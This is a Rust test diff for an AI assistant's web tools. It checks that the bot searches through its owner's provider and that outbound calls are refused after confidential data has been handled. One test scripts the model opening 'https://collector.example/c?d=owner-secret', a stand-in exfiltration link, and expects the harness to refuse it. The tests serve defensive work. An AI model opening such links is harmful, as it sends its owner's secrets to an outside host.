@@ -494,3 +494,128 @@ async fn research_followups_preserve_the_turn_budget() {
             .contains("search_session_call_budget_exceeded")
     );
 }
+
+/// Stands in for the owner's own search provider, so no test reaches the network.
+struct FixedSearch;
+
+#[async_trait]
+impl SearchProvider for FixedSearch {
+    async fn search(&self, _: &SearchRequest) -> Option<Value> {
+        Some(json!({
+            "status": "ok",
+            "tool": INTERNET_SEARCH_TOOL,
+            "results": [{
+                "title": "BMW cuts its outlook",
+                "url": "https://news.example/bmw-outlook",
+                "content": "BMW lowered its forecast for the year.",
+            }],
+        }))
+    }
+}
+
+fn web_bot(tool_specs: Vec<PlatformToolSpec>) -> PlatformCopilot {
+    let state = Arc::new(FlowLikeState::new(
+        FlowLikeConfig::new(),
+        HTTPClient::new_without_refetch(),
+    ));
+    PlatformCopilot::new(state, None)
+        .with_tool_rounds(4)
+        .with_tool_specs(tool_specs)
+        .with_web_access(WebAccess {
+            search: Some(Arc::new(FixedSearch)),
+            reader: None,
+        })
+}
+
+async fn run_web_bot(copilot: PlatformCopilot, client: &Client) -> String {
+    copilot
+        .chat_with_client(
+            PlatformSurface::Orchestrator,
+            "You are one of your owner's bots.".into(),
+            "What did BMW announce this week?".into(),
+            None,
+            Vec::new(),
+            "scripted".into(),
+            client,
+            None,
+            Arc::new(UnusedBridge),
+            None,
+            None::<fn(String)>,
+        )
+        .await
+        .unwrap()
+}
+
+fn search(id: &str) -> Vec<RawStreamingChoice<()>> {
+    call(id, INTERNET_SEARCH_TOOL, json!({ "query": "BMW outlook" }))
+}
+
+#[tokio::test]
+async fn a_bot_searches_the_web_itself_with_its_owners_search_provider() {
+    let client = Client::new(vec![search("search"), text("BMW cut its outlook.")]);
+
+    let answer = run_web_bot(web_bot(public_web_tool_specs()), &client).await;
+
+    assert_eq!(answer, "BMW cut its outlook.");
+    let after_search = client.request(1);
+    assert!(after_search.contains("https://news.example/bmw-outlook"));
+    assert!(after_search.contains("Host-verified web evidence state"));
+    assert!(!after_search.contains("raw_public_web_tool_unavailable"));
+}
+
+#[tokio::test]
+async fn a_link_the_bot_wrote_itself_is_not_opened() {
+    let client = Client::new(vec![
+        call(
+            "open",
+            OPEN_URL_TOOL,
+            json!({ "url": "https://collector.example/c?d=owner-secret" }),
+        ),
+        text("I could not open that."),
+    ]);
+
+    run_web_bot(web_bot(public_web_tool_specs()), &client).await;
+
+    assert!(client.request(1).contains("url_not_authorized"));
+}
+
+#[tokio::test]
+async fn private_tool_results_leave_the_web_tools_open() {
+    let mut specs = public_web_tool_specs();
+    specs.extend(find_global_tool_spec(MEMORY_SEARCH_TOOL));
+    let client = Client::new(vec![
+        call("recall", MEMORY_SEARCH_TOOL, json!({ "query": "BMW" })),
+        search("search"),
+        text("BMW cut its outlook."),
+    ]);
+
+    run_web_bot(web_bot(specs), &client).await;
+
+    assert!(client.request(1).contains("Your web tools stay available"));
+    let after_search = client.request(2);
+    assert!(after_search.contains("https://news.example/bmw-outlook"));
+    assert!(!after_search.contains("web_phase_closed_after_private_context"));
+}
+
+#[tokio::test]
+async fn a_turn_that_handled_data_above_the_bots_level_cannot_search() {
+    use super::super::bot_run::BotRunContext;
+    use flow_like_types::data_classification::{DataClassification, DataSensitivity};
+
+    let label = TurnLabel::new(&BotRunContext::general(), None);
+    label.raise(DataSensitivity {
+        classification: Some(DataClassification::Confidential),
+        pii: false,
+    });
+    let client = Client::new(vec![search("search"), text("I may not search now.")]);
+
+    run_web_bot(
+        web_bot(public_web_tool_specs()).with_turn_label(label),
+        &client,
+    )
+    .await;
+
+    let after_search = client.request(1);
+    assert!(after_search.contains("turn_label_outbound_refused"));
+    assert!(!after_search.contains("https://news.example/bmw-outlook"));
+}
